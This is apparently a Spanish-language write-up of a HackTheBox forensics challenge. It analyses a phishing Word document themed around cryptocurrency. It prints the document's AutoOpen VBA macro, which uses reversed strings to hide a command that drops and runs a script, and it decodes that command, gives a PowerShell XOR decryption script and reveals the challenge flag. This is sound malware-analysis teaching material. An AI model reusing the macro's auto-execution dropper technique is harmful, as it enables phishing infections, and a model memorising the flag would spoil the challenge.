---
title: MBCoin
description: >
  HackTheBox Forensics Challenge - Medium<br>
  [Challenge Download](https://app.hackthebox.com/challenges/370)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","medium", "macro","olevba","microsoft word"]
---

---
# Enunciado del problema

We have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months. This campaign abuses the current crypto market crash to target disappointed crypto owners. A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document. Analyze the supplied files and figure out what happened.

---
# Resolución

Como nos dan un **.doc** vamos a ver que macros tiene:

```vbs
-------------------------------------------------------------------------------
VBA MACRO bxh.bas 
in file: mbcoin.doc - OLE stream: 'Macros/VBA/bxh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Dim QQ1 As Object
    Set QQ1 = ActiveDocument.Shapes(1)
    Dim QQ2 As Object
    Set QQ2 = ActiveDocument.Shapes(2)
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.AlternativeText + QQ2.AlternativeText
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
    
    waitTill = Now() + TimeValue("00:00:05")
    While Now() < waitTill
    Wend
    MsgBox ("Unfortunately you are not eligable for free coin!")
    End
    
End Sub
```

Y vemos que ejecuta un comando:

```bash
$> echo "sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc" | rev              

cmd /k cscript.exe C:\ProgramData\pin.vbs
```

También podemos ver los macros dentro del *doc* en el apartado de *Tools*:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240505135117.png)

Ejecuntando el macro para obtener el pin.vbs (cambiando un par de rutas), obtenemos un código en powershell que si lo volvemos a ejecutar nos muestra:
```
$dir="C:\temp\mbcoin"

sl $dir
$fnames=@("pt.html",
          "vm.html")
$keys=@("6iIgloMk5iRYAw7ZTWed0CrjuZ9wijyQDjKO9Ms0D8K0Z2H5MX6wyOKqFxlOm1XpjmYfaQXacA6",
        "6iIoNoMk5iRYAw7ZTWed0CrjuZ9wijyQDjPy9Ms0D8K0Z2H5MX6wyOKqFxlOm1GpjmYfaQXacA6")

$x=0
foreach ($fname in $fnames) {
  $b = [System.IO.File]::ReadAllBytes("$($dir)\$($fname)"); 
  $k = $keys[$x]
  $r = New-Object Byte[] $b.length; 
  for($i=0; $i -lt $b.length; $i++) { 
    $r[$i] = $b[$i] -bxor $k[$i%$k.length]
  }
  if ($r.length -gt 0) { 
    [System.IO.File]::WriteAllBytes("$($dir)\$($fname).txt", $r)
  }
  $x+=1
}
```

Donde descargamos *pt.html y vn.html* de la captura de paquetes, y al ejecutar el código nos devuelve dentro del archivo la flag: `HTB{wH4tS_4_sQuirReLw4fFl3?}`